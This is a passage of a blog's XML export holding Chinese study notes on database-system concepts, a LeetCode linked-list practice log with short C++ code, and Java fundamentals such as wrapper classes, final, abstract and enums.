    <content><![CDATA[<p>勤能补拙是良训, 一分辛苦一分才.</p>
<ol>
<li>系列介绍</li>
<li>数据库的定义与目标</li>
<li>数据视图</li>
<li>数据库语言</li>
<li>关系数据库</li>
<li>数据库的设计</li>
<li>存储与查询</li>
</ol>
<a id="more"></a>
<h1 id="系列介绍"><a href="#系列介绍" class="headerlink" title="系列介绍"></a>系列介绍</h1><p>没错又开新系列了~~ 这次还是以学校开设的 &lt;&lt;数据库系统概念&gt;&gt; 课程为进度安排, 使用教材为机械工业出版社的 <a href="https://book.douban.com/subject/10548379/" target="_blank" rel="noopener">数据库系统概念</a> 黑皮书.</p>
<p>文章不会针对某一知识点具体展开叙述, 更多地是作为知识点的列举, 以便于日后回顾.</p>
<p>文章中也可能会穿插部分与期末考试强相关的信息.</p>
<h1 id="第一章-引言"><a href="#第一章-引言" class="headerlink" title="第一章 引言"></a>第一章 引言</h1><h2 id="数据库的定义与目标"><a href="#数据库的定义与目标" class="headerlink" title="数据库的定义与目标"></a>数据库的定义与目标</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p><strong>数据库管理系统 (Data Base-Management System, DBMS)</strong>由一个<u>互相关联的数据的集合</u>和一组<u>用以访问这些数据的程序(接口)组成</u></p>
<p>A database-management system (DBMS) is a collection of interrelated data and a set of programs to access those data.</p>
<h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><ul>
<li><p>DBMS的主要目标</p>
<p>to provide a way to <em>store and retrieve</em> database information that is both <strong>convenient</strong> and <strong>efﬁcient</strong></p>
</li>
<li><p>对数据的管理, 要求有一下几方面:</p>
<ul>
<li>信息体的<u>存储结构的定义</u></li>
<li>信息<u>操作机制的提供</u></li>
<li>信息<u>安全性</u>保证</li>
<li>信息共享时带来的冲突</li>
</ul>
</li>
</ul>
<p>在历史上，数据的管理经历了人工管理-文件系统管理-数据库管理的阶段。文件处理系统的主要弊端有：</p>
<ol>
<li>数据的冗余和不一致（data redundancy and inconsistency）</li>
<li>数据访问困难(difficulty in accessing data)</li>
</ol>
<p>需要解决的问题：</p>
<ol>
<li>数据孤立(data isolation) </li>
<li>完整性问题(integrity problem)</li>
<li>原子性问题(atomicity problem)</li>
<li>并发访问(concurrent-access anomaly)</li>
<li>安全性(security problem) </li>
</ol>
<h2 id="数据视图"><a href="#数据视图" class="headerlink" title="数据视图"></a>数据视图</h2><p>数据库系统包括：</p>
<ul>
<li>一组互相关联的数据</li>
<li>一组使用户便于读写的程序（接口）</li>
</ul>
<p>数据库系统提供了数据的抽象视图</p>
<h3 id="数据抽象"><a href="#数据抽象" class="headerlink" title="数据抽象"></a>数据抽象</h3><ul>
<li>物理层：最低层次的抽象，描述了数据是如何存储的</li>
<li>逻辑层：描述了系统中存储了什么数据，以及数据之间的关系。面向数据库管理员</li>
<li><p>视图层：最高层次的抽象，仅仅描述数据库的某个部分。同一个数据库可能拥有多种视图层</p>
<h3 id="实例与模式"><a href="#实例与模式" class="headerlink" title="实例与模式"></a>实例与模式</h3></li>
<li>实例：数据库在某一时刻存储在数据库中的信息的集合。</li>
<li>模式：数据库的总体设计方式</li>
</ul>
<p>任意时刻的实例都是该模式的具体，模式是实例的抽象。<br>根据不同的抽象层次模式又分为：</p>
<ul>
<li>物理模式：描述了数据库在物理层上的设计抽象模式</li>
<li>逻辑模式：描述了数据库在逻辑层上的设计抽象模式</li>
<li><p>子模式：描述了数据库在视图层上的设计抽象模式</p>
<h3 id="数据模型"><a href="#数据模型" class="headerlink" title="数据模型"></a>数据模型</h3><p>数据模型是一类概念的集合，这些概念描述了数据，数据联系，数据语义以及一致性约束。<br>常见的数据模型：</p>
</li>
</ul>
<ol>
<li>关系模型</li>
<li>实体-联系模型</li>
<li>基于对象数据模型</li>
<li><p>半结构化数据模型</p>
<h2 id="数据库语言"><a href="#数据库语言" class="headerlink" title="数据库语言"></a>数据库语言</h2><p>数据库语言分为数据定义语言（DDL）和数据操纵语言（DML）。<br>这两种并非对立的语言，而是同一门数据库语言的两部分。</p>
<h4 id="数据操纵语言DML"><a href="#数据操纵语言DML" class="headerlink" title="数据操纵语言DML"></a>数据操纵语言DML</h4><p>使用户能够访问或操作数据，包括以下访问类型：</p>
</li>
<li>Create 插入新的数据</li>
<li>Retrieve 从存储在数据库中的信息进行检索</li>
<li>Update 更新已有的数据</li>
<li>Delete 删除数据</li>
</ol>
<p>有两类基本的数据操纵语言：</p>
<ol>
<li>过程化DML ，需要用户指定需要的数据并且如何获得数据</li>
<li>声明式DML，仅需要指定需要的数据，不需要指明如何获得</li>
</ol>
<p>查询（Query）语言本义是特指DML中的检索语句，现在常作为DML的同义词。</p>
<h4 id="数据定义语言DDL"><a href="#数据定义语言DDL" class="headerlink" title="数据定义语言DDL"></a>数据定义语言DDL</h4><p>DDL不直接操作数据，而是对数据库模式进行设计的一种语言。数据库中的数值必须满足某些一致性约束，DDL正是指定这些约束的工具。DDL可用于：</p>
<ul>
<li>域约束</li>
<li>参照完整性</li>
<li>断言</li>
<li>授权</li>
</ul>
<p>DDL编写的结果储存在在数据字典中，数据字典中储存的内容被称作元数据。元数据是关于数据的数据，规定了表中数据应当符合的模式。（大概）</p>
<h2 id="关系数据库"><a href="#关系数据库" class="headerlink" title="关系数据库"></a>关系数据库</h2><p>关系型数据库基于关系模型，使用表来展示数据及数据间的联系。关系型数据库是目前最广泛使用的数据库，我们将在接下来几章详细讲解。</p>
<p>关系型数据库（例如SQL）常常无法用于复杂的计算，因此往往需要宿主语言（Java，C++）。数据库语言提供了一系列接口给宿主语言。</p>
<h2 id="数据库设计"><a href="#数据库设计" class="headerlink" title="数据库设计"></a>数据库设计</h2><h3 id="设计过程"><a href="#设计过程" class="headerlink" title="设计过程"></a>设计过程</h3><ol>
<li><p>确定用户的数据需求</p>
</li>
<li><p>概念设计</p>
<p>选择合适的数据模型并使用该模型将需求转化为一个数据库的概念模式</p>
</li>
<li><p>逻辑设计阶段</p>
<p>将高层的概念模式映射到实现数据模型上</p>
</li>
<li><p>物理设计阶段</p>
</li>
</ol>
<h3 id="实体-关系模型"><a href="#实体-关系模型" class="headerlink" title="实体-关系模型"></a>实体-关系模型</h3><p>实体-联系(E-R)数据模型使用一组称作实体的基本对象，以及这些对象间的联系。</p>
<p><strong>实体</strong> (entity) 是现实世界中可区别于其他对象的一件“事情”或一个“物体”。例如，每个人是一个实体，每个银行账户也是一个实体。实体通过<strong>属性</strong>(attribute)集合来描述</p>
<p><strong>联系</strong>(relationship)是几个实体之间的关联。同一类型的所有实体的集合称作实体集(entity set),同一类型的所有联系的集合称作联系集 (relationship set) </p>
<p>数据库的总体逻辑结构(模式)可以用实体-联系图(entity-relationship diagram, E-R图)进行图形化表示。最常用的方法之一是采用统一建模语言(Unified Modeling Language, UML) </p>
<ul>
<li>实体集用矩形框表示，实体名在头部，属性名列在下面。</li>
<li>联系集用连接一对相关的实体集的菱形表示，联系名放在菱形内部。</li>
</ul>
<h3 id="规范化"><a href="#规范化" class="headerlink" title="规范化"></a>规范化</h3><p>设计关系数据库所用到的另外一种方法是通常被称为<strong>规范化</strong>的过程。它的目标是生成一个关系模式集合，使我们存储信息时没有不必要的冗余，同时又能很轻易地检索数据。这种方法是设计一种符合适当的<strong>范式</strong>(normal form)的模式</p>
<h3 id="空值"><a href="#空值" class="headerlink" title="空值"></a>空值</h3><p>空值(null) 表示这个值不存在(或者未知)，未知值可能是 缺失(该值确实存在，但我们没有得到它)或不知道(我们不知道该值是否存在)。空值很难处理，所以最好不要用它。</p>
<h2 id="存储与查询"><a href="#存储与查询" class="headerlink" title="存储与查询"></a>存储与查询</h2><h3 id="存储管理器"><a href="#存储管理器" class="headerlink" title="存储管理器"></a>存储管理器</h3><p><strong>存储管理器</strong>是数据库系统中负责在数据库中<u>存储的低层数据与应用程序</u>以及<u>向系统提交的查询之间提供接口</u>的部件。存储管理器负责与<strong>文件管理器</strong>进行交互。存储管理器将各种DML语句翻译为底层文件系统命令,并存储在磁盘中。存储管理器负责数据库中数据的<u><em>存储、检索和更新</em></u>。 </p>
<p>存储管理部件包括：</p>
<ul>
<li><p>权限及完整性管理器(authorization and integrity manager)</p>
<p>它<u>检测是否满足完整性约束</u>，并检查试图访问数据的用户的权限。</p>
</li>
<li><p>事务管理器(transaction manager)</p>
<p>它保证即使发生了故障，数据库也<u>保持在一致的(正确的)状态</u>，并保证并发<u>事务的执行不发生冲突</u>。 </p>
</li>
<li><p>文件管理器(file manager)</p>
<p>它管理磁盘存储空间的分配，管理用于表示磁盘上所存储信息的数据结构。</p>
</li>
<li><p>缓冲区管理器(buffer manager)</p>
<p>它负责将数据从磁盘上取到内存中来，并决定哪些数据应被缓冲存储在内存中。</p>
</li>
</ul>
<p>存储管理器实现了几种<strong><u>数据结构</u></strong>，作为系统物理实现的一部分：</p>
<ul>
<li><p>数据文件(data files)</p>
<p>存储数据库自身。</p>
</li>
<li><p>数据字典(data dictionary)</p>
<p>存储关于数据库结构的元数据，尤其是数据库模式。</p>
</li>
<li><p>索引(index)</p>
<p>提供对数据项的快速访问。和书中的索引一样，数据库索引提供了指向包含特定值的数据的指针。</p>
</li>
</ul>
<h3 id="查询处理器"><a href="#查询处理器" class="headerlink" title="查询处理器"></a>查询处理器</h3><ul>
<li>DDL 解释器(DDL interpreter),它解释DDL语句并将这些定义记录在数据字典中。 </li>
<li>DML解释器(DML compiler),将查询语言中的DML语句翻译为一个执行方案，包括一系列查询执行引擎能理解的低级指令。</li>
</ul>
<p>DML编译器还进行查询优化(query optimization),也就是从几种选择中选出代价最小的一种。 </p>
<ul>
<li>查询执行引擎(query evaluation engine),执行由DML编译器产生的低级指令。 </li>
</ul>
<h2 id="事务管理"><a href="#事务管理" class="headerlink" title="事务管理"></a>事务管理</h2><p><strong>事务</strong> (transaction): 是数据库应用中完成单一逻辑功能的操作集合。每一个事务是一个既具原子性又具一致性的单元</p>
<blockquote>
<p>例如: 资金转账这一逻辑单元由两个基本操作组成: 其中一个系(A系)的账户进行取出操作，而另一个系(B系)的账户进行存入操作。显然，这两个操作必 须保证要么都发生要么都不发生。也就是说，资金转账必须完成或根本不发生。这种要么完成要么不 发生的要求称为<strong>原子性(atomicity)</strong> </p>
<p>除此以外，资金转账还必须保持数据库的一致性。也就是说，A 和B的余额之和应该是保持不变的。这种正确性的要求称作<strong>一致性(consistency)</strong> .最后，当资金转账 成功结束后，即使发生系统故障，账户A和账户B的余额也应该保持转账成功结束后的新值。这种保持的要求称作<strong>持久性(durability)</strong>。</p>
</blockquote>
<p>原子性和持久性的保证是数据库系统自身的职责，确切地说，是恢复管理器(recovery manager)的职责。为了保证原子性，失败的事务必须对数据库状态不产生任何影响。因此，数据库必须被恢复到该失败事务开始执行以前的状态, 即<strong>故障恢复(failure recovery)</strong></p>
<p>最后，当多个事务同时对数据库进行更新时，即使每个单独的事务都是正确的，数据的一致性也可能被破坏。<strong>并发控制管理器(concurrency-control manager)</strong>控制并发事务间的相互影响，保证数据库一 致性。</p>
<p>并发控制管理器和恢复管理器 都属于 <strong>事务管理器(transaction manager)</strong></p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>专业课</category>
        <category>数据库系统</category>
      </categories>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode刷题流水账2020-08</title>
    <url>/2020/09/01/LeetCode%E5%88%B7%E9%A2%98%E6%B5%81%E6%B0%B4%E8%B4%A62020-08/</url>
    <content><![CDATA[<p>Week 4 ✔</p>
<p>Week 5 ✘ ​</p>
<a id="more"></a>
<p>2020年8月22日 “再度”开始刷力扣</p>
<p>既然决定不读研就好好刷题学工程吧</p>
<p>每周七题以上. 如果遇到考试周等特别情况可以提前一周完成任务, 不得向后拖延.</p>
<h2 id="2020年8月22日-week4"><a href="#2020年8月22日-week4" class="headerlink" title="2020年8月22日-week4"></a>2020年8月22日-week4</h2><p>主题: 链表</p>
<h3 id="237-删除链表中的节点"><a href="#237-删除链表中的节点" class="headerlink" title="[237] 删除链表中的节点"></a>[237] 删除链表中的节点</h3><p>简单题</p>
<p>复习单链表</p>
<h4 id="删除当前节点"><a href="#删除当前节点" class="headerlink" title="删除当前节点"></a>删除当前节点</h4><p>传入参数仅为要删除的节点, (保证不是最后一个节点, 保证链表有两个及以上节点)</p>
<p>最初的思路自然是<strong>将前驱节点的指针指向后继节点</strong>, 但是无法取得前驱节点.</p>
<p>正确的思路: <strong>将本节点赋值为后继节点, 并删去后继节点.</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteNode</span><span class="params">(ListNode* node)</span> </span>&#123;</span><br><span class="line">        node-&gt;val = node-&gt;next-&gt;val;</span><br><span class="line">        node-&gt;next = node-&gt;next-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="19-删除链表的倒数第N个节点"><a href="#19-删除链表的倒数第N个节点" class="headerlink" title="[19] 删除链表的倒数第N个节点"></a>[19] 删除链表的倒数第N个节点</h3><p>中等题</p>
<p>学习了链表的两个常用技巧: 快慢双指针, 哑节点</p>
<h4 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a><strong>双指针</strong></h4><p>比较慢的做法是遍历两遍, 一次获取链表长度L, 一次删去倒数第几个数</p>
<p>可以设置两个指针, 快指针先走n步, 然后快慢指针一起走, 这样快指针到尾的时候慢指针正好到了倒数第n个</p>
<h4 id="哑节点"><a href="#哑节点" class="headerlink" title="哑节点"></a><strong>哑节点</strong></h4><p>其实就是数据结构课上那个首结点还是什么来着的, 就那个实际第一个节点的前面一个没有数据仅为了引导链表的节点. 加入这玩意可以简化链表操作.</p>
<blockquote>
<p>但是当我面对操作<strong>头节点</strong>的问题时，代码就无法通过测试了。<br>例如：我们一共有<strong>四个节点</strong>，需要删除<strong>倒数第四个</strong>节点。<br>因为当我们删除了头节点的时候，我们用什么来返回链表呢？</p>
</blockquote>
<h2 id="2020年8月31日-week5"><a href="#2020年8月31日-week5" class="headerlink" title="2020年8月31日-week5"></a>2020年8月31日-week5</h2><p>主题:链表</p>
<h3 id="206-反转链表"><a href="#206-反转链表" class="headerlink" title="[206]反转链表"></a>[206]反转链表</h3><p>简单题</p>
<p>使用了三种方法解决: 完全地反向构建一个新链表; 原地迭代反转链表; 原地递归反转链表.</p>
<p>反向复制: 从头到尾地遍历, 每次复制遍历到的节点, 并将该节点的指向为刚才复制的节点.</p>
<p>原地迭代: 将本节点的指向从后节点指向前节点, 注意储存后节点和本节点的地址</p>
<p>递归反转: 假设后半段已经复制好了.还是不太能理得清楚. <a href="https://leetcode-cn.com/problems/reverse-linked-list/solution/fan-zhuan-lian-biao-by-leetcode/" target="_blank" rel="noopener">链接</a></p>
<h3 id="21-合并两个有序链表"><a href="#21-合并两个有序链表" class="headerlink" title="[21] 合并两个有序链表"></a>[21] 合并两个有序链表</h3><p>简单题</p>
<p>两种: 迭代比较/递归合并</p>
<p>迭代比较: 双指针, 指向的小的那个并入结果链表(注: 不需要实际复制一遍链表, 只要使用指针即可)</p>
<p>递归比较: 每次小的指向合并后半部分的返回结果</p>
<p>注意: 两个链表为空/有一个为空的情况, 只需要两次判断即可</p>
<h3 id="234-回文链表"><a href="#234-回文链表" class="headerlink" title="[234] 回文链表"></a>[234] 回文链表</h3><p>简单</p>
<p>On遍历, 将链表的数据储存在数组中, 从前从后比较</p>
<p>进阶: 时间On 空间O1, 将后半部分链表翻转, 然后双指针比较(未完成)</p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>屠龙术</category>
        <category>算法与刷题</category>
        <category>力扣刷题流水账</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Java拾遗之基本类库</title>
    <url>/2020/10/08/Java%E6%8B%BE%E9%81%97%E4%B9%8B%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%BA%93/</url>
    <content><![CDATA[<p>第七章 Java基础类库<br>本节应当配备Java Document使用.<br>在线网址: <a href="https://docs.oracle.com/en/java/javase/index.html" target="_blank" rel="noopener">https://docs.oracle.com/en/java/javase/index.html</a><br>下载地址: <a href="https://stackoverflow.com/questions/6986993/how-to-download-javadoc-to-read-offline" target="_blank" rel="noopener">https://stackoverflow.com/questions/6986993/how-to-download-javadoc-to-read-offline</a></p>
<ul>
<li>系统类System</li>
<li>字符串: String, StringBuffer, StringBuilder</li>
<li>Math类</li>
<li>Data与Calendar</li>
<li>正则表达式</li>
<li>日志</li>
</ul>
<a id="more"></a>
<h2 id="7-1-与用户交互"><a href="#7-1-与用户交互" class="headerlink" title="7.1 与用户交互"></a>7.1 与用户交互</h2><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><ul>
<li>main函数的方法签名: <code>public static void main(String[] args){...}</code></li>
<li>main函数需要暴露给JVM调用,因此使用public修饰;</li>
<li>main函数在调用时直接通过主类静态调用,因此使用static修饰;</li>
<li>main函数没有返回值</li>
<li>main函数的参数可以在运行时指定.例如 <code>java ArgsTest hello world</code> 这里args数组为{“hello”,”world”}</li>
</ul>
<h3 id="Scanner-类"><a href="#Scanner-类" class="headerlink" title="Scanner 类"></a>Scanner 类</h3><ul>
<li>Scanner是一种基于正则表达式的文本扫描器. </li>
<li>hasNextXXX();</li>
<li>nextXXX();</li>
</ul>
<h2 id="7-2-系统交互"><a href="#7-2-系统交互" class="headerlink" title="7.2 系统交互"></a>7.2 系统交互</h2><ul>
<li>通过C语言实现Java的native方法: <a href="https://blog.csdn.net/hjh_walker/article/details/52439149" target="_blank" rel="noopener">https://blog.csdn.net/hjh_walker/article/details/52439149</a></li>
<li>可以通过System类访问操作系统的信息</li>
<li>可以通过Runtime类访问运行环境(JVM)的相关信息.</li>
<li>还可以通过Runtime类的静态方法exec()新建进程运行操作系统的命令.</li>
</ul>
<h2 id="7-3-常用类"><a href="#7-3-常用类" class="headerlink" title="7.3 常用类"></a>7.3 常用类</h2><ul>
<li>Object类是所有类,数组,枚举类的父类.Object提供了一些静态方法.(所有类都可以使用)</li>
<li>equals(Object obj); 判断对象是否相等. 这里判断是否是同一个对象(也就是针对地址的判断)</li>
<li>protected void finalize(); 垃圾回收器调用该方法来回收对象</li>
<li>getClass(); 返回对象的运行时类</li>
<li>int hashCode();默认情况下是根据对象的地址计算.但大多数类都重写了该方法.</li>
<li>toString();默认情况下返回 “类名+@+hashCode” 的值,往往需要对其重写.</li>
<li>protected clone();会返回一个当前对象的副本.这个方法只能被子类重写或调用.这种克隆更快,但是是浅克隆.</li>
<li><p>浅克隆:引用类型变量只复制地址; 深克隆:引用类型变量指向的对象也会被复制 参考:<a href="https://segmentfault.com/a/1190000022552883" target="_blank" rel="noopener">https://segmentfault.com/a/1190000022552883</a></p>
</li>
<li><p>Java7 新增了一系列工具类.它们大多是空指针安全的.</p>
</li>
<li>这些工具类大多以”s”结尾.例如 <code>Objects</code>,<code>Arrays</code></li>
</ul>
<h2 id="7-4-字符串操作"><a href="#7-4-字符串操作" class="headerlink" title="7.4 字符串操作"></a>7.4 字符串操作</h2><ul>
<li>Java中的String是不可变的,直到对象被销毁.</li>
<li>StringBuffer 是一个字符序列可变的字符串.在操作完该字符序列后使用toSting()将其转换为String对象</li>
<li>StringBuilder 也代表可变字符串对象. 但Buffer是线程安全的,而Builder是非安全的. 因此Builder的性能更高.</li>
<li>charAt(); 用于读取字符串的下标.string 的其他方法不列出</li>
<li>StringBuilder 的常用方法: append(),insert(),delete(),reverse(),length(),capacity()</li>
</ul>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>驭龙术</category>
        <category>Java</category>
        <category>Java拾遗</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>面向对象</tag>
      </tags>
  </entry>
  <entry>
    <title>Java拾遗之面向对象</title>
    <url>/2020/10/08/Java%E6%8B%BE%E9%81%97%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
    <content><![CDATA[<p>又开的新坑~ 目标是把平日里关于Java的学习到的碎片化知识先记录下来, 待日后回顾.</p>
<p>希望以后会回顾(逃)</p>
<p>目前在学习的是李刚老师的 <a href="https://book.douban.com/subject/3246499/" target="_blank" rel="noopener">疯狂JAVA讲义 (第四版)</a> </p>
<a id="more"></a>
<h2 id="第六章：面向对象（下）"><a href="#第六章：面向对象（下）" class="headerlink" title="第六章：面向对象（下）"></a>第六章：面向对象（下）</h2><ul>
<li>包装类：将基本类型封装成对象使用</li>
<li>final关键词</li>
<li>abstract：抽象类</li>
<li>interface：接口</li>
</ul>
<h3 id="6-1-包装类"><a href="#6-1-包装类" class="headerlink" title="6.1 包装类"></a>6.1 包装类</h3><ul>
<li>自动装箱/拆箱：基本类型与包装类型的直接转换</li>
<li>包装类的两类静态方法，用于操作string与类型的装换</li>
</ul>
<blockquote>
<p>parseXXX(string str);    将string类型转为XXX类型.例如<code>int a = parseInt(&quot;123&quot;);</code><br>valueOf(string str); 作用同上</p>
</blockquote>
<ul>
<li>String 包装类中也有将其他类型的转为string类的valueOf函数.例如<code>string a = String.valueOf(123.4);</code></li>
<li>或者可以直接 <code>string a = 123.4 + &quot;&quot; ;</code></li>
</ul>
<hr>
<ul>
<li>包装类是引用类型,但是直接与基本类型比较时会自动比较其值;但是两个包装类比较时依旧比较引用的对象是否是一个</li>
<li>不应当对两个装箱后的包装类比较.Integer包装类在初始化时会初始化-128~127的数组.所有被包装的,值在这个范围内的Integer对象指向的是堆中的同一个.但是不在这个范围内的对象指向的不是用一个对象.因此:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Integer a &#x3D; 2;</span><br><span class="line">Integer b &#x3D; 2;</span><br><span class="line">&#x2F;*这里a&#x3D;&#x3D;b,因为作为引用类型的变量,他们指向堆中的同一个地址(即Integer类被初始化时创建的那个数组)*&#x2F;</span><br><span class="line">Integer A &#x3D; 128;</span><br><span class="line">Integer B &#x3D; 128;</span><br><span class="line">&#x2F;*这里A!&#x3D;B,因为这是新创建的两个不同指向的引用类型的变量,尽管他们指向的地址所储存的值是一样的*&#x2F;</span><br></pre></td></tr></table></figure></li>
<li><p>这么设置的原因是为了提前针对小值的Integer包装类对象进行缓存,提高性能</p>
</li>
<li><p>Java7 对所有的包装类提供了专门用于比较的静态方法compare.例如:<code>Integer.compare()</code>    //TODO:存疑:这个方法是用来比较基本类还是包装类的?还是说可以混合比较?</p>
</li>
<li>Java7对Character,Java8对包装类功能增强.</li>
</ul>
<hr>
<h3 id="6-2处理Object"><a href="#6-2处理Object" class="headerlink" title="6.2处理Object"></a>6.2处理Object</h3><ul>
<li><p>所有类都是Object类的子类</p>
</li>
<li><p>Object类中有toString()方法.他会在对象被打印时自动调用.用于自我描述,例如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Object p;</span><br><span class="line">&#x2F;*以下3行是等价的*&#x2F;</span><br><span class="line">System.out.println(p);</span><br><span class="line">System.out.println(p.toString());</span><br><span class="line">System.out.println(p + &quot;&quot;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>基础的toString() 会返回 “类名+@+hashCode” 的值,可以并往往需要对其重写.通常会返回成类似”Apple[color=red,weight=5.6]”的字符串</p>
</li>
</ul>
<hr>
<ul>
<li><p>对于基本类型可以使用==进行相等判断,但是引用类型变量必须要指向相同地址时才会返回true.因此Object类提供了静态方法Object.equal(Object obj)</p>
</li>
<li><p>默认的equal方法依旧只比较该变量的地址(也就是和==一个效果),因此我们往往也会重写equal方法.该方法需要满足:自反性,对称性,传递性,一致性</p>
</li>
<li><p>JVM常量池保证相同的字符串直接量只有一个.</p>
</li>
</ul>
<h3 id="6-3-类成员与static"><a href="#6-3-类成员与static" class="headerlink" title="6.3 类成员与static"></a>6.3 类成员与static</h3><ul>
<li><p>类成员属于整个类,而非某个对象.被static修饰的就是类成员.</p>
</li>
<li><p>当类第一次被使用时,类成员(包括类变量与类方法)被加载,直到类不被使用而被垃圾回收.</p>
</li>
<li><p>可以通过类或类的实例对象来访问类成员,但这不代表类成员属于该实例对象.</p>
</li>
<li><p>静态初始化块也是类成员的一种, 一般是在类被初始化时执行该块.</p>
</li>
<li><p>类成员不能访问实例成员</p>
</li>
</ul>
<hr>
<ul>
<li>如果某种类仅允许拥有一个实例,它被称为单例(Singleton)</li>
<li>该类的构造器被修饰为private</li>
<li>该类需要提供一个静态方法来产生第一个实例(并且,如果以前产生过实例则返回先前产生的实例)</li>
<li>需要一个private static 的类变量储存曾经创建的实例(如果有)</li>
</ul>
<hr>
<h3 id="6-4-final"><a href="#6-4-final" class="headerlink" title="6.4 final"></a>6.4 final</h3><ul>
<li>被final修饰的变量不可被重新赋值.</li>
<li>final可以修饰成员变量(包括类变量与实例变量),也可以修饰局部变量.这两者有些许不同.</li>
</ul>
<h4 id="final修饰成员变量"><a href="#final修饰成员变量" class="headerlink" title="final修饰成员变量"></a>final修饰成员变量</h4><ul>
<li><p>final修饰类变量: 必需在静态初始化块,或声明类变量时指定初始值.且只能在二处之一指定初始值.</p>
</li>
<li><p>final修饰实例变量: 必需在非静态初始化块,或声明实例变量时, 或构造器中指定初始值.且只能在三处之一指定初始值.</p>
</li>
</ul>
<h4 id="final修饰局部变量"><a href="#final修饰局部变量" class="headerlink" title="final修饰局部变量"></a>final修饰局部变量</h4><ul>
<li><p>final修饰的局部变量可以在声明时不指定初始值.如果没有指定,则可以在后续代码中进行赋值,但只能赋值一次.</p>
</li>
<li><p>形参可以被final修饰,那么在函数体中该参数不能被赋值.</p>
</li>
<li><p>引用变量可以被final修饰,但是锁定的是该引用类型变量所指向的地址.引用的对象的成员变量的值依旧可以被改变.</p>
</li>
<li><p>一个在定义时就指定了初始值的final变量如果在编译时就可以确定初始值,那么它将起到类似宏替换的效果.</p>
</li>
</ul>
<h4 id="final方法"><a href="#final方法" class="headerlink" title="final方法"></a>final方法</h4><ul>
<li>被final修饰的方法无法被子类重写.例如Object类中的 getClass() 方法.</li>
<li>比较: 被private修饰的方法无法被子类访问; 另外注意区分重写与重载的区别.</li>
<li>被final和private同时修饰的方法可以在子类中被 “重写”. 但实质上是子类的新方法.并非真正意义上的重写.</li>
</ul>
<h4 id="final类"><a href="#final类" class="headerlink" title="final类"></a>final类</h4><ul>
<li>被final修饰的类无法有子类. 例如java.lang.Math类. </li>
<li>当子类继承父类时可以访问父类的内部数据,甚至可以重写父类方法.因此需要对该父类限制继承.</li>
</ul>
<h4 id="不可变类-immutable"><a href="#不可变类-immutable" class="headerlink" title="不可变类(immutable)"></a>不可变类(immutable)</h4><ul>
<li>创建出的该类的实例的实例变量是不可改变的.例如8个包装类以及java.lang.String类</li>
<li><p>TODO:自建不可变类的注意事项</p>
</li>
<li><p>由于被final修饰的引用变量依旧是可以改变的.因此直接包括引用变量的不可变类并不是真正的不可变. 可以在涉及到相关操作时创建新的匿名类来规避.</p>
</li>
</ul>
<h3 id="6-5-抽象类与abstract"><a href="#6-5-抽象类与abstract" class="headerlink" title="6.5 抽象类与abstract"></a>6.5 抽象类与abstract</h3><ul>
<li><p>抽象类必须使用abstract修饰.抽象方法也必须使用abstract修饰,并且不能有方法体.</p>
</li>
<li><p>抽象类中未必包括抽象方法.但包括抽象方法的类必须是抽象类.</p>
</li>
<li><p>抽象类不能有实体.不能被实例化.可以有构造器但不能被直接构造.(构造器用于被子类重写).</p>
</li>
<li><p>其子类需要实现父类的所有抽象类.否则,子类也是一个抽象类.</p>
</li>
<li><p>被abstract修饰的类只能被继承,而被final修饰的类不能被继承.因此这两个修饰符不能同时使用.</p>
</li>
<li><p>被abstract修饰的方法只能子类实现,而被static修饰的方法只能被该类调用.因此这两个修饰符不能同时修饰方法.但是可以同时修饰部类.</p>
</li>
</ul>
<p>TODO:接口</p>
<h3 id="6-9-枚举"><a href="#6-9-枚举" class="headerlink" title="6.9 枚举"></a>6.9 枚举</h3><ul>
<li><p>枚举是一种特殊的类.使用enum进行修饰.(该关键词与class,interface等价).一个java源文件只能有一个被public修饰的enum类.</p>
</li>
<li><p>枚举类默认继承java.lang.Enum类(而非Object类).因此枚举类不能显式继承其他父类.Enum提供了一些接口.</p>
</li>
<li><p>非抽象的enum类默认使用final修饰,因此不能派生子类.</p>
</li>
<li><p>枚举类的构造器只能使用private修饰.</p>
</li>
<li><p>枚举类的所有实例必须在第一行显式列出.</p>
</li>
<li><p>Enum 类中提供的一些接口:</p>
<ol>
<li>int compareTo(E o):用于与相同枚举类型的对象进行比较排序.若该对象位于o之后返回正整数,反之返回负整数或0.</li>
<li>String name() 与 String toString():都可以返回当前实例的名称.习惯上使用后者.</li>
<li>int ordinal(): 返回当前枚举实例的索引值(从0开始)</li>
</ol>
</li>
</ul>
<h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><p>多态的三个条件:</p>
<ol>
<li><p>要有继承</p>
</li>
<li><p>子类要有重写父类的方法</p>
</li>
<li>父类引用指向子类对象</li>
</ol>
<p>一句话概括: new谁就调用谁的方法，引用是谁，就用谁的成员和静态。</p>
<p>另一句话概况: 除了重写过的非静态方法之外，都是用的父类的。</p>
<p>实际的过程: 语句在<strong>堆内存</strong>中开辟了<u>子类的对象</u>，并把<strong>栈内存</strong>中的父类的引用指向了这个子类对象</p>
<p>详细一点的解释: </p>
<ol>
<li>对于(非静态的)成员变量, 依旧是使用的父类的成员变量</li>
<li>对于(非静态的)成员方法,会时候子类的成员方法</li>
<li>对于静态的成员变量/方法, 会使用父类的. 这是由于静态的是属于类, 算不上重写 . 那么自然是使用的</li>
</ol>
]]></content>
      <categories>
